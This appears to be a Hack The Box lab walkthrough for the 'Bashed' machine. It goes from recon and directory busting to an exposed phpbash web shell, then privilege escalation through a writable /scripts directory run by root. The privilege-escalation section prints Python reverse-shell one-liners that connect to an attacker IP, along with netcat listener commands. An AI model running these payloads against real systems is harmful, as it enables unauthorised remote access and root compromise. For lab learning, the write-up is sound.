# Bashed [HTB](https://app.hackthebox.com/machines/Bashed)
![bashed-01]()


## Recon

I start by adding the target to my `/etc/hosts` file. Then i use `nmap` to scan the target:

```bash
nmap -sC -sV -A -p- bashed.htb -oN nmap.result
```

![nmap-res-02()


We have the following:

+ An Apache server on port 80. 


Lets see what this site has to offer. 


## Apache port 80


Lets open our browser and navigate towards the target site at `http://bashed.htb`

![site-03]()


The site talks about different tools developed for pentesting, at the moment we only see the `phpbash` 
tool with a valid link. Lets check it out:

![phpbash-04]()


If we click on the [Github link](https://github.com/Arrexel/phpbash) we will be brought to the following 
page:

![github-05]()

Sounds useful, lets see how to use this tool:

![usage-06]()

Accourding to the instructions, we need to upload the tool to the target server and access it through the URL to get a web-shell. However, the target site said that this tool was developed on the same machine,
so this `phpbash` should be somewhere on the server, lets try and find it. 

I use `ffuf` for directory busting:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.[67/1995$
 -u http://bashed.htb/FUZZ
```

![dev-07]()

This `dev` directory looks promising, lets check it out:

![dev-dir-08]()

Here it is, if we click it we get access to the system:

![shell-09]()

Lets try to elavate our privileges. 


## Privilege Escalation

If we take a look at the `/etc/passwd` file:

```bash
cat /etc/passwd
```

![passwd-10]()

We can see we have two valid user accounts on the system that are not service accounts. Now if we take a 
look at the `sudo` permissions with:

```bash
sudo -l
```

![sudo-privs-11]()


As you can see, the `www-data` user can run any command without a password as the `scriptmanager` user.
So we can pop a shell as `scriptmanager` fairly easily with sudo, but first, we need an actual TTY shell, 
not a web shell. 

We can use a one liner revese shell, but first lets setup the listener with:

```bash
rlwrap nc -lnvp 443
```

Then we can use Python for the reverse shell:

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.42",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

![tty-shell-12]()

Now we can switch to the `scriptmanager` user by running:

```bash
sudo -u scriptmanager /bin/bash
```

![switch-user-13]()

If we go to the root directory and run `ls` we can see something unusual:

![scripts-14]()


If we `cd` into this directory and run `ls -l` inside we can see the following:

![scripts-ll-15]()


We have a python script, owned by our user, and a `test.txt` file owned by root. Lets take a look at the python script:

![py-script-16]()

The script simply creates a file called `test.txt` and writes `testing 123!` to it. This is the file ownedby root we saw before in our current directory. The fact taht the file is owned by root tells me there is a task running in the background periodically as the root user, executing this `test.py` script. 

We can verify this with [pspy64](https://github.com/DominicBreuker/pspy):

![task-17]()


This is bad, we have a task running as root, executing files ending with a `.py` extension, found in a directory owned by a low-privileged user. Escalation in this scenario is fairly trivial, since we can execute
any command we want as root, through these python scripts.

All we need to do is paste a one-liner Python reverse shell into a file in the `/scripts` directory:

```bash
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.42",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' >> pwned.py
```

Setup a listener:

```bash
rlwrap cn -lnvp 9001
```

And we should get a shell as root:

![root-18]()
